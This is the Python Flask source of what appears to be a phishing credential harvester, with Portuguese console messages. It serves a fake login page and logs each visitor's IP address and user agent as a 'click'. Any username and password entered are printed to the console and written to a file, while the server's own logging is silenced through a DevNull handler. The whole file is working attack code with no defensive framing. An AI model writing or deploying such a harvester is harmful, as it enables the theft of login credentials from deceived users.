from flask import Flask, render_template, request
from src.file import Files
from gevent.pywsgi import WSGIServer
from src.hide_logs import DevNull
from os import getenv
from dotenv import load_dotenv


app = Flask(__name__)


@app.route('/', methods=["GET", "POST"])
def main():
    user = request.form.get("username")
    password = request.form.get("password")

    if request.method == "GET":
        if request.environ['REMOTE_ADDR']:
            print()
            print('USUÁRIO CLICOU!')
            print(request.environ['REMOTE_ADDR'])
            print(request.headers.get('User-agent'))
            print()

        return render_template('login.html')
    else:
        if len(request.form.get("username").replace(' ', '')) == 0:
            user = 'EMPTY-USERNAME'
        if len(request.form.get("password").replace(' ', '')) == 0:
            password = 'EMPTY-PASSWORD'

        if len(request.form.get("username").replace(' ', '')) and len(request.form.get("password").replace(' ', '')):
            print(f'DADOS DE {request.environ["REMOTE_ADDR"]}')
            print(f'USUÁRIO: {user}')
            print(f'SENHA: {password}')
        else:
            print('USUÁRIO INSERIU CAMPO(S) VAZIO(S)')

        print()

        Files.create_file(user, password, request.environ['REMOTE_ADDR'], request.headers.get('User-agent'))
        return render_template('login.html', user=user, password=password)


if __name__ == '__main__':
    load_dotenv()

    # app.run(port=getenv('PORT'), host=getenv('HOST'), debug=False)
    server = WSGIServer((getenv('HOST'), getenv('PORT')), app, log=DevNull)
    server.serve_forever()
